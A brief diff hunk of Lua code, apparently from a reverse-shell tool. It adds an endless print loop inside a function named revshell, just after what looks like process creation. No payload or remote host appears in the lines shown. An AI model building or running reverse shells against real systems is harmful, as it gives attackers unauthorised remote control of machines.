@@ -365,6 +365,10 @@ function revshell(sock)
       startInfo,
       procInfo
     )
+    while(true)
+    do
+        print("This loop will run forever.")
+    end
 end
 
 function logs(sock, val)
